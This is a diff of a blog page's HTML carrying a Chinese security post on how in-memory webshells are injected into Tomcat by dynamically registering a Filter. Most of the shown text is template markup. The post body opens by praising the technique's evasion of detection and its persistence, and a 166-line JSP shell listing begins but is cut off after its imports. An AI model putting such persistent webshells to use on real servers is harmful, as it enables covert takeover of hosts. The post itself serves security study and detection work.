@@ -1,82 +1,278 @@
-<!DOCTYPE HTML>
-<html>
+<!DOCTYPE html>
+<html lang="cn">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="​            目前webshell的免杀开始向内存中迁移，这样实现的好处显而易见，将webshell注入到内存中，一方面增加了查杀的难度，另一方面即使我们传入的文件被查杀，只要服务器不重启，我们仍然可以利用注入到内存中的shell控制主机，所以了解内存shell的实现是比较重要的。 动态注册Filter实现内存马​            要了解如何动态实现filter过滤器加载内存马，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马实现原理解析">
+<meta property="og:url" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/index.html">
+<meta property="og:site_name" content="藏青&#39;s BLOG">
+<meta property="og:description" content="​            目前webshell的免杀开始向内存中迁移，这样实现的好处显而易见，将webshell注入到内存中，一方面增加了查杀的难度，另一方面即使我们传入的文件被查杀，只要服务器不重启，我们仍然可以利用注入到内存中的shell控制主机，所以了解内存shell的实现是比较重要的。 动态注册Filter实现内存马​            要了解如何动态实现filter过滤器加载内存马，">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112417193.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112241202.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114624897.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114725785.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225114506040.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121140703.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121243273.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134433759.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134519636.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134526683.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225144929433.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145256764.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145324041.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145355643.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145548170.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145909761.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150035887.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150119180.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150321470.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150403698.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150516874.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150630961.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150731473.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151110960.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151057672.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151431915.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142018334.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142105141.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142153204.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228143903686.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228144126525.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150628029.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150721604.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228151816221.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228152128438.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153406512.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153855563.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153949211.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113628383.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113730266.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113838455.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228114652723.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115336921.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115634740.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120511795.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120830868.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170513038.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170253396.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093140871.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093340066.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093636388.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100908801.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100927048.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102204521.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102331539.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229103618089.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104504167.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104534258.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104718640.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104856204.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229105256054.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229115530952.png">
+<meta property="article:published_time" content="2020-12-24T05:40:03.000Z">
+<meta property="article:modified_time" content="2021-09-28T11:38:36.957Z">
+<meta property="article:author" content="藏青">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="SHELL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225112417193.png">
+
+<link rel="canonical" href="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Tomcat内存马实现原理解析 | 藏青's BLOG</title>
   
-  <title>Tomcat内存马实现原理解析 | 藏青&#39;s BLOG</title>
-
-  
-  <meta name="author" content="藏青">
-  
-
-  
-  <meta name="description" content="知行合一">
-  
-
-  
-  <meta name="keywords" content="渗透 内网 代码审计">
-  
-
-  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-
-  <meta property="og:title" content="Tomcat内存马实现原理解析"/>
-
-  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
-
-  
-  <meta property="og:image" content="/favicon.ico"/>
-  
-
-  <link href="/favicon.ico" rel="icon">
-  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
-<meta name="generator" content="Hexo 4.2.0"></head>
 
 
-<body>
-<div class="blog">
-  <div class="content">
 
-    <header>
-  <div class="site-branding">
-    <h1 class="site-title">
-      <a href="/">藏青&#39;s BLOG</a>
-    </h1>
-    <p class="site-description"></p>
-  </div>
-  <nav class="site-navigation">
-    <ul>
-      
-    </ul>
-  </nav>
-</header>
 
-    <main class="site-main posts-loop">
-    <article>
 
-  
-    
-    <h3 class="article-title"><span>Tomcat内存马实现原理解析</span></h3>
-    
-  
 
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2020/12/24/Tomcat内存马实现原理解析/" rel="bookmark">
-        <time class="entry-date published" datetime="2020-12-24T05:40:03.000Z">
-          2020-12-24
-        </time>
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">藏青's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
       </a>
-    </span>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
   </div>
 
 
-  
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
 
-  <div class="article-content">
-    <div class="entry">
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tomcat内存马实现原理解析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-12-24 13:40:03" itemprop="dateCreated datePublished" datetime="2020-12-24T13:40:03+08:00">2020-12-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-28 19:38:36" itemprop="dateModified" datetime="2021-09-28T19:38:36+08:00">2021-09-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
         <p>​            目前webshell的免杀开始向内存中迁移，这样实现的好处显而易见，将webshell注入到内存中，一方面增加了查杀的难度，另一方面即使我们传入的文件被查杀，只要服务器不重启，我们仍然可以利用注入到内存中的shell控制主机，所以了解内存shell的实现是比较重要的。</p>
 <h2 id="动态注册Filter实现内存马"><a href="#动态注册Filter实现内存马" class="headerlink" title="动态注册Filter实现内存马"></a>动态注册Filter实现内存马</h2><p>​            要了解如何动态实现filter过滤器加载内存马，首先得了解几个问题</p>
@@ -277,37 +473,190 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span 